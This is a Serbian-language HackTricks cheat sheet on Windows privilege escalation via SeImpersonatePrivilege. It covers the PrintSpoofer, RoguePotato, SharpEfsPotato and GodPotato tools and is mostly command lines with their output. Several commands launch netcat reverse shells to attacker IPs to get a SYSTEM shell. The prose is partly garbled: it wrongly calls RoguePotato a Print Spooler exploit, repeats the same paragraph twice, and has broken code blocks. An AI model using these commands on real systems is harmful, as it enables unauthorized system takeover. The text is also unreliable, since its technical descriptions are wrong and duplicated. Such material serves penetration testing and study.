# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

{% hint style="warning" %}
**JuicyPotato ne radi** na Windows Serveru 2019 i Windows 10 verziji 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno objašnjava alat `PrintSpoofer`, koji se može koristiti za zloupotrebu privilegija impersonacije na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.
{% endhint %}

## Brza demonstracija

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

RoguePotato je tehnika eskalacije privilegija koja iskorišćava ranjivost u Windows Print Spooler servisu. Ova tehnika omogućava napadaču da dobije sistemski nivo privilegija na ciljnom računaru.

Da bi se iskoristila ova ranjivost, napadač mora imati lokalni pristup ciljnom računaru. Prvo, napadač mora da preuzme i pokrene RoguePotato exploit. Ovaj exploit koristi ranjivost u Print Spooler servisu da bi kreirao lažni print server. Kada se lažni print server pokrene, napadač može da izvrši proizvoljan kod sa sistemskim privilegijama.

RoguePotato je posebno opasan jer se izvršava sa sistemskim privilegijama, što znači da napadač ima potpunu kontrolu nad ciljnim računarom. Ova tehnika može biti korišćena za instaliranje zlonamernog softvera, krađu podataka ili izvršavanje drugih napada na ciljnom računaru.

Da bi se zaštitili od RoguePotato napada, preporučuje se ažuriranje sistema sa najnovijim zakrpama i isključivanje Print Spooler servisa ako nije neophodan. Takođe je važno ograničiti pristup lokalnim računima i pratiti sumnjive aktivnosti na mreži.

```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```

```
```

\`\`\` SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log" SharpEfsPotato by @bugch3ck Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

\[+] Triggering name pipe access on evil PIPE \localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2 df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc: \[x]RpcBindingSetAuthInfo failed with status 0x6d3 \[+] Server connected to our evil RPC pipe \[+] Duplicated impersonation token ready for process creation \[+] Intercepted and authenticated successfully, launching program \[+] Process created, enjoy!

C:\temp>type C:\temp\w.log nt authority\system

```
### RoguePotato

RoguePotato je tehnika eskalacije privilegija koja iskorišćava ranjivost u Windows Print Spooler servisu. Ova tehnika omogućava napadaču da dobije sistemski nivo privilegija na kompromitovanom sistemu.

Da bi se iskoristila ova ranjivost, napadač mora imati lokalni pristup sistemu. Prvo, napadač mora da pokrene RoguePotato exploit, koji će zatim iskoristiti ranjivost u Print Spooler servisu. Kada se ranjivost iskoristi, napadač će dobiti sistemski nivo privilegija.

Ova tehnika je posebno opasna jer napadač može iskoristiti RoguePotato exploit da bi preuzeo kontrolu nad sistemom i izvršavao proizvoljni kod sa sistemskim privilegijama. To znači da napadač može da instalira zlonamerni softver, pristupi osetljivim podacima ili čak preuzme kontrolu nad celokupnim mrežnim okruženjem.

Da biste se zaštitili od RoguePotato napada, preporučuje se ažuriranje sistema sa najnovijim zakrpama i isključivanje Print Spooler servisa ako nije neophodan za vaše poslovanje. Takođe, trebali biste pratiti bezbednosne vesti i preporuke proizvođača kako biste bili informisani o najnovijim ranjivostima i merama zaštite.
```

GodPotato -cmd "cmd /c whoami" GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"

```
## Reference
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
```
